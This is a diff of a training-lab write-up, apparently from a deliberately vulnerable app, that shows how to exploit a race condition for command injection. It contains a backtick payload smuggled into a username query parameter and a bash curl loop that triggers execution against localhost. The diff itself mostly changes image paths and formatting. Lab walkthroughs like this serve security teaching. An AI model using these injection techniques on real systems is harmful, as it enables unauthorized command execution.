@@ -16,13 +16,13 @@ Now that the app is running let's go hacking!
 
 ## Reconnaissance
 
-#### Step1
+### Step1
 
 {% hint style="success" %}
 Congratulations, you won the race
 {% endhint %}
 
-![](../../.gitbook/assets/java/RaceCondition/1.png)
+![](../../.gitbook/assets/python/RaceCondition/1.png)
 
 All you need to do now is to add your name to the board and get your price.
 
@@ -32,11 +32,11 @@ The application verifies whether the username contains special characaters such 
 
 `[A-Za-z0-9 ]*`
 
-![](../../.gitbook/assets/java/RaceCondition/2.png)
+![](../../.gitbook/assets/python/RaceCondition/2.png)
 
 If the username is correct, clicking `Boot` will put us on the score board. Yeah!!
 
-![](../../.gitbook/assets/java/RaceCondition/3.png)
+![](../../.gitbook/assets/python/RaceCondition/3.png)
 
 #### Step 2
 
@@ -114,13 +114,12 @@ The problem is that in this case, we have a very small window to execute the `bo
 
 ## Exploitation
 
-Before we can exploit the race condition, we need a good payload that will execute the command for us. We know that the double quotes and the backslash cannot be used to break the command, but we also know that using '`' backtick.
+Before we can exploit the race condition, we need a good payload that will execute the command for us. We know that the double quotes and the backslash cannot be used to break the command, but we also know that using '\`' backtick.
 
 So our payload will be:
 
 ```
 `id`
-
 ```
 
 in order to execute the command `id` on the target system.
@@ -129,15 +128,14 @@ Now we can exploit this sequence to achieve a command injection. In order to do 
 
 Doing it manually is practically impossible, so we create a script that does that for us:
 
-```sh
+```bash
 #!/bin/bash
 while true; do
 
-	curl -i -s -k  -X $'GET' \
-	    -H $'Host: localhost:5000' -H $'User-Agent: Semen Rozhkov exploiter v1.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate ' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
-	    $'http://localhost:5000/?action=run' | grep "Check this out"
+    curl -i -s -k  -X $'GET' \
+        -H $'Host: localhost:5000' -H $'User-Agent: Semen Rozhkov exploiter v1.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate ' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
+        $'http://localhost:5000/?action=run' | grep "Check this out"
 done
-
 ```
 
 and in the meantime we send the other request from the browser like
@@ -148,10 +146,12 @@ http://localhost:5000/?person=Default+User`id`&action=validate
 
 If we look in the logs we will see:
 
-![](../../.gitbook/assets/java/RaceCondition/4.png)
+![](../../.gitbook/assets/python/RaceCondition/4.png)
 
+{% hint style="success" %}
 Congratulations, you won the race for real now!!!!!!!!
+{% endhint %}
 
 ## Additional sources
 
-{% embed url="https://wiki.owasp.org/index.php/Testing_for_Race_Conditions_(OWASP-AT-010)" %}
+{% embed url="https://www.owasp.org/index.php/Testing_for_Race_Conditions_(OWASP-AT-010)" %}
